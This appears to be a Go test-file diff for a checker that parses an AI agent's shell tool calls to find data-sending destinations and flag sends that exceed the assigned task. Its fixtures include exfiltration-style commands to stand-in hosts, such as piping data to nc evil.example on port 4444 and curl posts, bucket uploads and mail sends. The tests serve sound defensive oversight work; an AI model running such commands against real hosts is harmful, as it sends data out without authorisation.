@@ -27,13 +27,19 @@ import (
 
 func shellScopeDests(t *testing.T, command string) []string {
 	t.Helper()
+	out, _ := shellScopeRead(t, command)
+	return out
+}
+
+func shellScopeRead(t *testing.T, command string) (out []string, unreadable bool) {
+	t.Helper()
 	args, err := json.Marshal(map[string]string{"command": command})
 	if err != nil {
 		t.Fatal(err)
 	}
 	var trunc bounded.Truncated
-	var out []string
-	for _, d := range callSendDestinations("Bash", string(args), &trunc) {
+	dests, unreadable := callSendDestinations("Bash", string(args), &trunc)
+	for _, d := range dests {
 		if d.mailbox != "" {
 			out = append(out, "mbx:"+d.mailbox)
 		} else {
@@ -41,13 +47,13 @@ func shellScopeDests(t *testing.T, command string) []string {
 		}
 	}
 	sort.Strings(out)
-	return out
+	return out, unreadable
 }
 
 // A shell command is read by its commands. Each case below is a shape that the
 // text pattern misread in the owner-trace corpus (real turns): the same words in
 // a commit message, the scheme of a URL, -f or -t of another command, a curl -G
-// query. They are not sends (GAP-0363).
+// query. They are not sends (GAP-0366).
 func TestIntentScopeShellNotASend(t *testing.T) {
 	for name, command := range map[string]string{
 		"words in a commit message":       "git add a.go && git commit -q -m \"fix: curl -d @- and curl -F file=@- uploads\n\nmail ops@corp.example\"",
@@ -96,19 +102,54 @@ func TestIntentScopeShellSends(t *testing.T) {
 		"rsync to remote":          {"rsync -az dir/ user@backup.example:/data/", []string{"backup.example"}},
 		"rsync -e ssh":             {"rsync -az -e 'ssh -p 22' dir/ user@r.example:/data/", []string{"r.example"}},
 		"mail":                     {"mail -s subj boss@corp.example < f", []string{"mbx:boss@corp.example"}},
-		"sendmail headers":         {"printf 'To: x@mail.example\\n\\nbody' | sendmail -t", []string{"mbx:x@mail.example"}},
+		"mail recipient argument":  {"mail -s subj boss@corp.example", []string{"mbx:boss@corp.example"}},
+		"xargs":                    {"xargs -I{} curl -d {} https://x.example/ < f", []string{"x.example"}},
+		"nohup":                    {"nohup curl -d x https://n.example/ &", []string{"n.example"}},
 		"aws s3 upload":            {"aws s3 cp f s3://bucket-x/k", []string{"bucket-x"}},
 		"gsutil upload":            {"gsutil cp f gs://bucket-g/k", []string{"bucket-g"}},
 		"nc":                       {"echo hi | nc evil.example 4444", []string{"evil.example"}},
 		"two destinations":         {"curl -d a https://one.example/ && curl -d b https://two.example/", []string{"one.example", "two.example"}},
-		"host from a variable":     {"curl -d x \"https://$HOST/x\"", nil},
-		"unparsed (quote left)":    {"curl -d x https://fb.example/ \"unterminated", []string{"fb.example"}},
 		"quoted url with userinfo": {"curl -d x 'https://user:pw@ui.example/x'", []string{"ui.example"}},
 	} {
 		got := shellScopeDests(t, tc.command)
 		if strings.Join(got, ",") != strings.Join(tc.want, ",") {
 			t.Errorf("%s: destinations %v, want %v", name, got, tc.want)
 		}
+	}
+}
+
+// A command that may send and cannot be read is unreadable: the unknown tier
+// applies to the send, and no text is scanned for a host (GAP-0363).
+func TestIntentScopeShellUnreadable(t *testing.T) {
+	for name, command := range map[string]string{
+		"host built by the shell": "curl -d x \"https://$HOST/x\"",
+		"loop over hosts":         "for h in a b; do curl -d x https://$h.example/; done",
+		"syntax error":            "curl -d x https://fb.example/ \"unterminated",
+		"mail with no recipient":  "mail -s subj < f",
+		"recipients in headers":   "printf 'To: x@mail.example\\n\\nbody' | sendmail -t",
+	} {
+		dests, unreadable := shellScopeRead(t, command)
+		if !unreadable {
+			t.Errorf("%s: not reported unreadable (destinations %v)", name, dests)
+		}
+	}
+	for name, command := range map[string]string{
+		"commit message":     "git commit -m \"curl -d x https://evil.example/\"",
+		"plain read":         "ls -la && cat go.mod",
+		"curl with variable": "curl -sS \"$URL\" -o /tmp/x",
+	} {
+		if dests, unreadable := shellScopeRead(t, command); unreadable || len(dests) != 0 {
+			t.Errorf("%s: read as a send (%v, unreadable %v)", name, dests, unreadable)
+		}
+	}
+	args := `{"command":"curl -d x \"https://$HOST/x\""}`
+	reason := intentScopeExceeded("update the changelog", nil, "Bash", args)
+	if reason != scopeUnreadableReason {
+		t.Errorf("unreadable send reason = %q", reason)
+	}
+	floor := applyIntentScopeFloor(nil, reason)
+	if floor == nil || floor.Severity != "HIGH" || len(floor.Findings) != 1 || floor.Findings[0] != intentScopeFinding {
+		t.Errorf("unreadable floor = %+v", floor)
 	}
 }
 
